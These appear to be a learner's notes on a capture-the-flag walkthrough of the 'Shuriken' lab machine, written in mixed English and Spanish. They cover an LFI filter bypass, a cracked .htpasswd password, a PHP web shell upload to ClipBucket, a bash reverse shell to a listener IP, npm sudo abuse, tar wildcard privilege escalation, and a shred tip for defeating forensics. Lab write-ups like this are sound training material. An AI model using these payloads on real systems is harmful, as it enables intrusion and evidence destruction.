Skills
- Web Enumeration
- JS Code Inspection
- Information Leakage
- Local File Inclusion (LFI + Base64 Wrapper)
- Virtual Hosting
- Subdomain Enumeration
- Abusing LFI - Reading Apache config files

- Cracking Hashes
- ClipBucket v4.0 Exploitation - Malicious PHP File Upload
- Abusing sudoers privilege (npm) [User Migration]
- Process Monitoring - PSPY
- Abusing Cron Job - Analyzing Bash script
- Abusing Wildcards (tar command) [Privilege Escalation]

Certifications

eWPT OSCP OSWE

First step targeting

arp-scan -I wlan0 --localnet

OUI (organization unic identifier) virtualbox

Ip 192.168.0.73
ttl 64=linux
sudo nmap -p- --open -sS -n -Pn --min-rate 5000 192.168.0.73 -vvv -oN allports


Apache/2.4.29 launchpad = ubuntu bionic

Aditional, he uses 

nmap --script http-enum -p80 192.168.0.73

This is a brute force script
(in function of the response to the server ex : 200  or 404. The scripts sends to you the route)

```
|   /login.html: Possible admin folder
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /secret/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
```
whatweb, this responses what technologies are using behind the web service, and content container (wordpress, drupal , jumbla) 
```
[200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.0.73], Script, Title[Shuriken]
```

[FUZZER]
  

El fuzz testing es un **método de prueba dinámico para encontrar errores y problemas de seguridad en el software**. Durante una prueba fuzz, un programa o una función bajo prueba se ejecuta con entradas no válidas, inesperadas o aleatorias para descubrir casos improbables o inesperados.

Now, when we look on the url, we see that it is avaliable to a bruteforce attack but first we are going to enumerate the website


we have this url 

http://192.168.0.75/js/index__7ed54732.js

and a big code of javascript verty hard to read, so we are going to watch on javascript beautifier.


in the folder 192.168.0.75/secret/ 
it is an image, but this guy says that this hasnot occult information
esteganography

```
La esteganografía trata el estudio y aplicación de técnicas que permiten ocultar mensajes u objetos, dentro de otros, llamados portadores, para que no se perciba su existencia.
```

It is not necesary to understand all the code, but it is interesting to watch routes or other things on the javascript code

we  found this ones

```
http://broadcast.shuriken.local
# sourceMappingURL=index_7ed54732.js.map

"http://shuriken.local/index.php?referer="
# sourceMappingURL=index_d8338055.js.map

```

So ,i try to search on http://shuriken.local/index.php?referer= but the conecction refuses me in, but if i put myself on a console

curl -s -X GET http://shuriken.local/index.php?referer=

and i try to get some resource , for example /etc/passwd I can read the files

but what does -s and -X in curl ?

-s (silent) Silent mode... and X ?
-X (X is a request) --request < method >

This two ussers can execute a bash

```
root:x:0:0:root:/root:/bin/bash
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
```

So, in this point when we do the petitions to the server, we are in the "index.php" , and we can go to another routes.

If you want to see only the index.php you must do this

php://filter/convert.base64-encode/resource=index.php

and we can see only the archive, otherwise we will get into a infinite "bucle"
```
http://shuriken.local/index.php?referer=php://filter/convert.base64-encode/resource=index.php
```
(this is a #WRAPER, decodification on base64)

aparently I havent this resource, i must investigate to get it .


we have the code on base64, so we must do a = echo "text"  base64 -d ; echo

This script has a sanitization, when we put "../" it is replaced by " "
![[scriptphp.png]]
But if we made ....//....//....//etc/passwd will remain two points and a slash, because only replace it once, not twice
![[explanation.png]]
#Directory-path-traversal
(THIS IS A DIRECTORY PATH TRAVERSAL)
This will be the path traversal
```
curl -s -X GET ....//....//....//....//....//etc/passwd
```
And we did it. When we do this, we can se the users on the machine. (with the | grep sh$ we can see which of them are users with bash.. that are registered users that can execute a bash on the sistem)

we are going to see the /etc/hosts, this is an #enumeration process

with gobuster we may see this hosts on localhost, if we have done a research.
w(dictionary)
u (url)
vhost (virtual host?)
t (threads)
```
gobuster vhost -u http://shuriken.local -w /usr/share/DNS/subdomains-top1million-5000.txt -t 20
```
a lot of "vhost" 

```
Found: 1 Status: 400 [Size: 427]
Found: 11192521404255 Status: 400 [Size: 427]
Found: gc._msdcs Status: 400 [Size: 427]
Found: 11192521403954 Status: 400 [Size: 427]
Found: 2 Status: 400 [Size: 427]
Found: 11285521401250 Status: 400 [Size: 427]
Found: 2012 Status: 400 [Size: 427]
Found: 11290521402560 Status: 400 [Size: 427]
Found: 123 Status: 400 [Size: 427]
Found: 2011 Status: 400 [Size: 427]
Found: 3 Status: 400 [Size: 427]
Found: 4 Status: 400 [Size: 427]
Found: 2013 Status: 400 [Size: 427]
Found: 2010 Status: 400 [Size: 427]
Found: 911 Status: 400 [Size: 427]
Found: 24 Status: 400 [Size: 427]
Found: 10 Status: 400 [Size: 427]
Found: 7 Status: 400 [Size: 427]
Found: 99 Status: 400 [Size: 427]
Found: 2009 Status: 400 [Size: 427]
Found: www.1 Status: 400 [Size: 427]
Found: 11 Status: 400 [Size: 427]
Found: 50 Status: 400 [Size: 427]
Found: 12 Status: 400 [Size: 427]
Found: 20 Status: 400 [Size: 427]
Found: 2008 Status: 400 [Size: 427]
Found: 25 Status: 400 [Size: 427]
Found: 15 Status: 400 [Size: 427]
Found: 5 Status: 400 [Size: 427]
Found: www.2 Status: 400 [Size: 427]
Found: 13 Status: 400 [Size: 427]
Found: 100 Status: 400 [Size: 427]
Found: 44 Status: 400 [Size: 427]
Found: 54 Status: 400 [Size: 427]
Found: 9 Status: 400 [Size: 427]
Found: 70 Status: 400 [Size: 427]
Found: 01 Status: 400 [Size: 427]
Found: 16 Status: 400 [Size: 427]
Found: 39 Status: 400 [Size: 427]
Found: 6 Status: 400 [Size: 427]
Found: www.123 Status: 400 [Size: 427]

```
We cannot get nothing of this so, he said that for watch credentials we can see on the configuration route of apache it is on /etc/apache2/sites-enabled and watch the archive caled 000-default.conf


this is , we have more info here
![[apacheconf.png]]


We watch on that, and maybe the user is developers and the password ... 

skill (- Abusing LFI - Reading Apache config files)

```
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
        <script src="/js/index__7ed54732.js"></script>
        <script src="/js/index__d8338055.js"></script>

```

now we must "crack" the password with john the ripper

skill (Cracking Hashes)

john -w:/usr/share/wordlists/rockyou.txt

/etc/apache2/.htpasswd

```
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```
9972761drmfsls

This are the credentials. Now we find a exploit for clipbucket

if we want to autenticate us with curl, we must do this


In this way you are putting the credentials on te curl petition 
```
curl -s -X GET "http://developers:9972761drmfsls@broadcast.shuriken.local/"
```

(skills - ClipBucket v4.0 Exploitation - Malicious PHP File Upload)

We have been using an exploit searched on metasploit with the comand searchsploit, for clipbucket v4.0. We obtan the information that the page is vulnerable to insert malicious archives, in this case we are using a php archive, like i did in other ocasions. This was the command

```
curl -F "file=@cmd.php" -F "plupload=1" -F "name=cmd.php" http://developers:9972761drmfsls@broadcast.shuriken.local/actions/photo_uploader.php
```

and cmd.php is this

```
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"
?>
```


with  | jq we can see the json response

curl -F "file=@cmd.php" -F "plupload=1" -F "name=cmd.php" http://developers:9972761drmfsls@broadcast.shuriken.local/actions/photo_uploader.php | jq
```
 "success": "yes",
  "file_name": "1691461034652393",
  "extension": "php",
  "file_directory": "2023/08/08"

```

so... we put the archive but we dont know where, we will find it with dirbuster

gobuster dir -u http://developers:9972761drmfsls@broadcast.shuriken.local -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -t 20


And this is the result !!!
```
===============================================================
2023/08/08 04:26:08 Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 336] [--> http://broadcast.shuriken.local/files/]
/plugins              (Status: 301) [Size: 338] [--> http://broadcast.shuriken.local/plugins/]
/ajax                 (Status: 301) [Size: 335] [--> http://broadcast.shuriken.local/ajax/]
/includes             (Status: 301) [Size: 339] [--> http://broadcast.shuriken.local/includes/]
/js                   (Status: 301) [Size: 333] [--> http://broadcast.shuriken.local/js/]
/api                  (Status: 301) [Size: 334] [--> http://broadcast.shuriken.local/api/]
/cache                (Status: 301) [Size: 336] [--> http://broadcast.shuriken.local/cache/]
/images               (Status: 301) [Size: 337] [--> http://broadcast.shuriken.local/images/]
/player               (Status: 301) [Size: 337] [--> http://broadcast.shuriken.local/player/]
/styles               (Status: 301) [Size: 337] [--> http://broadcast.shuriken.local/styles/]
/readme               (Status: 200) [Size: 2968]
/LICENSE              (Status: 200) [Size: 2588]
/actions              (Status: 301) [Size: 338] [--> http://broadcast.shuriken.local/actions/]
/server-status        (Status: 403) [Size: 289]
Progress: 220125 / 220561 (99.80%)
===============================================================                                                                                                       
2023/08/08 04:29:15 Finished                                                                                                                                          
===============================================================       
```

the route is here http://broadcast.shuriken.local/files/photos/2023/08/08/1691461034652393.php, so now im going to use a reverse shell to come inside of the machine



http://broadcast.shuriken.local/files/photos/2023/08/08/1691461034652393.php?cmd=whoami

bash -c "bash -i >%26 /dev/tcp/192.168.100.4/443 0>%261"

i have been instaled pwncat-cs.. so i can have interactive consoles with pwncat

1 pwncat-cs -lp 443
2 back
3 if you have not "clear" cmd you export TERM=xterm

when you want to delete someting and it will more dificult to reconsstruct for forensic invesstigations use

shred -zun 10 -v *

all right we are on the we cannot have acces to "server-management" folder so we need to scalate on priviledges, surely we are going to see in the groups what kind of posibilities we have

id= no groups
sudo -l= we can execute as (server-management) NOPASSWD: usr/bin/npm command

sudo -u -server-management npm 

**- Abusing sudoers privilege (npm) [User Migration]**


gtfobins
```

TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```
we must put -u  server-management

so this is the command, 

sudo npm -C $TF --unsafe-perm i 


TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo -u  server-management npm -C $TF --unsafe-perm i


WE CANNOT DO IT WE MUST GIVE PERMISSIONS FIRST... we ust put echo $TF ... to see the path of this variable


and is this 

```
/tmp/tmp.s5RPXZx7ZT

```
chmod 777 -R /tmp/tmp.s5RPXZx7ZT

NOW IT WORKED....

SO.. whoami 

sever-manadgement

and now we must put a bash to use a bash

now, lets find permisions 

find / -perm -4000 -ls 2>/dev/null

we have the pkexec (pwnkit)

now he is going to the tmp folder

and he is going to "monitor comands or task that are executing on the system"

systemctl list-timers

and there is nothing

**- Process Monitoring - PSPY**

now he is going to try with pspy

we downloaded psy64 form github and then we create a python server on our local machine to dowload on the target machine

python3 -m http-server, but remember do it as sudo

is maked on go, and the app reports which user executes which command

we can do it like this too "ps -eo user,command"


This is interesting, but we have not permissions so we are going to se a little bit
cat /var/opt/back...
```
/bin/bash /var/opt/backupsrv.sh
```
**- Abusing Cron Job - Analyzing Bash script**
```
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

```


**- Abusing Wildcards (tar command) [Privilege Escalation]**

***Las wildcards o comodines son **una serie de caracteres especiales que nos permiten encontrar patrones o realizar búsquedas más avanzadas**. Es aplicable para archivos y directorios.***


hace un backup en backupfiles e incluye todo lo que hay en el directorio, en var bacukps +hostname +day, crea un comprimido tar..
dice que jugar con los "wildcats no es una buena idea" porque tar o cualquier comando... (?)... dice que toma como parametro una carpeta con un nombre de un comando... ej
```
 kali >touch -l

 kali >ls -l
 -l

kali ls *
 -l
```
so, aparently this is a problem , we can execute a shell if we use tar
```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
but if i do this I will still being "server-manadgement"
i must create an archive called
```
touch -- --checkpoint=1
touch -- --checkpoint-action=exec='sh command'
```
so, if i do this "root" take this as "tar parameters"... so if i do an archive called:
```
touch command
chmod +x command
nano command ^C
ls -l /bin/bash
```
Revisa otra vez todo, pero creo que funciona asi... como a cada rato se esta ejecutando este backup , yo puedo abusar de que tar interprete eso como sudo... entonces aparentemente ese comando que pusimos fue un script 

This is what is inside of the archive caled "command"
```
!#/bin/bash

chmod u+s /bin/bash
```


we monitore it with 
```
watch -n 1 ls -l /bin/bash
```
the permissions was first
-rwxr-xr-x root root
and changed to
-rwsr-xr-x

.... so now i can execute 
bash -p

this was the documents on the  folder of the backups 

/home/server-management/Documents

```
bash-4.4# ls
'--checkpoint-action=exec=sh command'   'Employee Search Progress Report.pdf'
'--checkpoint=1'                         command
'Daily Job Progress Report Format.pdf'
```



